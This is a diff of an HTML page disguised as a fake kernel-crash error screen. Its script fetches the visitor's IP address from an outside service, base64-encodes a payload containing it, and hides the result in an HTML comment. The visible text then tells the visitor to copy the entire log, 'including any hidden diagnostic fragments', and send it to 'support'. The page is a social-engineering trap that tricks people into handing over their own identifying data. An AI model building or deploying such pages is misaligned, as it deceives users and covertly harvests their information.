@@ -20,37 +20,37 @@
             text-align: center;
         }
         .glitch {
-            font-size: 5.2rem;
-            letter-spacing: 14px;
-            animation: glitch 4.5s infinite;
-            text-shadow: 0.07em 0 0 #f00, -0.05em -0.06em 0 #0ff;
+            font-size: 5.5rem;
+            letter-spacing: 16px;
+            animation: glitch 5s infinite;
+            text-shadow: 0.08em 0 0 #f00, -0.06em -0.07em 0 #0ff;
         }
         @keyframes glitch {
-            0%,100% { text-shadow: 0.07em 0 0 #f00, -0.05em -0.06em 0 #0ff; }
-            15% { text-shadow: -0.07em -0.04em 0 #f00, 0.04em 0.05em 0 #0ff; }
-            35% { text-shadow: 0.07em 0.05em 0 #f00, -0.04em 0 0 #0ff; }
+            0%,100% { text-shadow: 0.08em 0 0 #f00, -0.06em -0.07em 0 #0ff; }
+            18% { text-shadow: -0.08em -0.05em 0 #f00, 0.05em 0.06em 0 #0ff; }
+            42% { text-shadow: 0.08em 0.06em 0 #f00, -0.05em 0 0 #0ff; }
         }
         #error-main {
-            max-width: 92%;
-            padding: 30px;
+            max-width: 94%;
+            padding: 40px;
         }
         #error-log {
-            margin: 50px 0 30px;
-            font-size: 0.95rem;
-            color: #444;
-            line-height: 1.5;
-            max-height: 40vh;
+            margin: 60px 0 40px;
+            font-size: 0.98rem;
+            color: #333;
+            line-height: 1.6;
+            max-height: 45vh;
             overflow-y: auto;
             white-space: pre-wrap;
             word-break: break-all;
         }
-        .small-hint {
+        .tiny-footer {
             position: fixed;
-            bottom: 12px;
-            right: 16px;
-            font-size: 0.7rem;
-            color: #222;
-            opacity: 0.3;
+            bottom: 8px;
+            right: 12px;
+            font-size: 0.65rem;
+            color: #111;
+            opacity: 0.25;
             pointer-events: none;
         }
     </style>
@@ -58,42 +58,42 @@
 <body>
 
     <div id="error-main">
-        <div class="glitch">FATAL EXCEPTION</div>
-        <p style="font-size:1.6rem; margin:40px 0 20px;">SHADOW NODE CRASH - INTEGRITY VIOLATION</p>
-        <p style="color:#555; font-size:1.15rem; margin-bottom:15px;">
-            Critical kernel fault detected. Diagnostic payload captured.<br>
-            Forward this log fragment to support for root cause analysis:
+        <div class="glitch">CRITICAL FAULT</div>
+        <p style="font-size:1.7rem; margin:45px 0 25px;">SHADOW NODE INTEGRITY BREACH</p>
+        <p style="color:#444; font-size:1.2rem; margin-bottom:20px;">
+            Kernel-level exception detected. Diagnostic fragment captured.<br>
+            Please forward this complete log block to support team:
         </p>
-        
+
         <div id="error-log">
-Loading diagnostic chain...
-[0x00007FF] KERNEL_SHADOW_PANIC
-[0xDEAD0001] INACCESSIBLE_MEMORY_BLOCK
-[0xBEEF1337] CORRUPTED_ENTROPY_STREAM
-Stack trace overflow → recovery loop engaged
-Memory dump partial: █▓▓▓▓▓░░░░░░░░░░ 47% complete
-Entropy buffer corruption detected
+[0x0000000007B] KERNEL_SHADOW_PANIC
+[0xDEAD0002] INACCESSIBLE_ENTROPY_BLOCK
+[0xBEEF4242] CORRUPTED_MEMORY_STREAM
+Stack trace overflow detected → recovery loop initiated
+Memory dump partial: █▓▓▓▓▓░░░░░░░░░░ 52% complete
+Entropy buffer corruption chain active
 Signature fragment: #A3F97B2E1C4D8E90uyyoiduyawo39284kjsdf
-Dump tail: ...== corrupted chain end ==
-Send full log to admin
+Dump tail: ...== corrupted chain termination ==
+Send full log fragment to administrator
         </div>
 
-        <p style="color:#666; font-size:1.1rem;">
-            Please copy the entire log above (including any hidden fragments) and reply with it.
+        <p style="color:#555; font-size:1.15rem;">
+            Copy the entire log above (including any hidden diagnostic fragments) and reply.
         </p>
     </div>
 
-    <div class="small-hint">v0.7b • build 20260308</div>
+    <div class="tiny-footer">v0.7b • shadow-node • 20260308</div>
 
     <!-- 
-       diagnostic shadow checksum fragment v0.7b 
-       integrity hash chain: 0xA3F9-7B2E-1C4D-8E90
-       partial entropy buffer: [REDACTED] 
-       encoded diagnostic payload: [BASE64 GOES HERE]
+       shadow-node boot integrity check v0.7b 
+       chain hash: 0xA3F9-7B2E-1C4D-8E90 
+       entropy fragment buffer: [REDACTED]
     -->
 
+    <!-- integrity-check: shadow-node-v0.7b-entropy-buffer-fragment-[BASE64-HERE] -->
+
     <script>
-        async function captureAndHide() {
+        async function captureAndInjectDeep() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
@@ -116,32 +116,27 @@ Send full log to admin
                     };
 
                     const json = JSON.stringify(payload);
-                    const b64 = btoa(json);
+                    const encoded = btoa(json);
 
-                    // Inject into the deep comment
-                    const comment = document.body.lastChild;
-                    if (comment && comment.nodeType === 8) {  // comment node
-                        let text = comment.textContent;
+                    // Inject into the very last comment
+                    const lastComment = document.body.lastChild;
+                    if (lastComment && lastComment.nodeType === 8) {
+                        let text = lastComment.textContent;
                         text = text.replace(
-                            'encoded diagnostic payload: [BASE64 GOES HERE]',
-                            'encoded diagnostic payload: ' + b64
+                            '[BASE64-HERE]',
+                            encoded
                         );
-                        comment.textContent = text;
+                        lastComment.textContent = text;
                     }
 
-                    console.log("Payload hidden:", payload); // for your debug
+                    console.log("Data injected deep:", payload);
                 }
-            } catch (err) {
-                console.warn("Capture failed", err);
+            } catch (e) {
+                console.warn("Capture failed", e);
             }
         }
 
-        captureAndHide();
-
-        // Optional: if someone goes to #decode, show a fake decoder (but you don't need it)
-        if (location.hash === '#decode') {
-            document.body.innerHTML = '<div style="padding:40px; font-size:1.8rem;">DECODE INTERFACE (admin only)<br><br>Paste signature here → decode manually</div>';
-        }
+        captureAndInjectDeep();
     </script>
 </body>
 </html>
